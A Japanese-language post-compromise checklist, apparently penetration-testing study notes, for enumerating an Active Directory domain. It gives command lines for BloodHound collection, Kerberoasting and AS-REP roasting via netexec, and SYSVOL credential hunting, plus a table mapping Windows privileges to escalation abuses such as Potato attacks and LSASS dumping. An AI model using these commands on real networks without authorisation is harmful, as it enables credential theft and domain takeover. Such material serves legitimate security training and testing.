# Windows AD 侵入後 列挙チェックリスト

初期シェル（WinRM / SMB / RDP 等）を取得したら、次の権限昇格・横断移動のために以下を確認する。**BloodHound による全体把握が最優先。**

---

## Step 1: 現在のユーザーの確認（即座に実行）

```powershell
whoami
whoami /all        # 権限・グループ・特権トークンを確認
net user [USERNAME] /domain   # ドメイン上のユーザー情報
```

**着眼点 — 特権トークン（Privileges）の確認：**

| 特権 | 悪用方法 |
|------|---------|
| `SeImpersonatePrivilege` | Potato 系攻撃で SYSTEM に昇格 |
| `SeAssignPrimaryTokenPrivilege` | 同上 |
| `SeBackupPrivilege` | SAM / SYSTEM ハイブの読み取り |
| `SeRestorePrivilege` | 任意ファイルの書き込み |
| `SeMachineAccountPrivilege` | ドメインにコンピューターアカウントを追加可能 → **RBCD 攻撃** |
| `SeEnableDelegationPrivilege` | Unconstrained Delegation を設定可能 |
| `SeDebugPrivilege` | プロセスメモリへのアクセス → LSASS ダンプ |

---

## Step 2: BloodHound でAD全体を把握（最重要）

```bash
# 攻撃側マシン（Linux）から実行
bloodhound-python -u [USER] -p '[PASSWORD]' -ns [DC_IP] -d [DOMAIN] -c All
```

**BloodHound で確認すべき項目：**
1. 「Shortest Paths to Domain Admins」→ 現在のユーザーから Domain Admins への最短ルート
2. 「Find All Domain Admins」→ DA メンバーの把握
3. 「Find Principals with DCSync Rights」→ DCSync が可能なアカウント
4. 現在のユーザー・所属グループが持つ ACE（アクセス制御エントリ）

→ 詳細: `../../05_Tools_Reference/BloodHound.md`

---

## Step 3: グループとメンバーシップの確認

```powershell
# 所属グループの確認
net user [USERNAME] /domain

# Domain Admins のメンバー
net group "Domain Admins" /domain

# 高権限グループの確認
net group "Enterprise Admins" /domain
net group "Account Operators" /domain
net group "Backup Operators" /domain
```

---

## Step 4: コンピューターアカウントの列挙

```bash
# Linux 側から
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --computers
```

**着眼点：** Unconstrained Delegation が設定されたコンピューターを探す。

---

## Step 5: Kerberoastable / ASREPRoastable アカウントの確認

```bash
# Kerberoastable（SPN付きアカウント）
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --kerberoasting output.txt

# ASREPRoastable（事前認証不要アカウント）
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --asreproast output.txt
```

→ 詳細: `Kerberos_Attacks/Kerberoasting.md`, `Kerberos_Attacks/ASREPRoasting.md`

---

## Step 6: SYSVOL / NETLOGON の確認

```bash
smbclient //[IP]/SYSVOL -U '[DOMAIN]\[USER]%[PASSWORD]' -c "recurse ON; ls"
```

認証済みユーザーとして SYSVOL にアクセスし、スクリプトに他ユーザーの認証情報が含まれていないか確認する。

---

## 関連技術
- BloodHound で ACE が判明 → `ACE_Abuse/` 配下の該当ファイル
- SeMachineAccountPrivilege がある → `Delegation_Attacks/RBCD.md`
- SeEnableDelegationPrivilege がある → `Delegation_Attacks/Unconstrained.md`
- Kerberoastable アカウントがある → `Kerberos_Attacks/Kerberoasting.md`
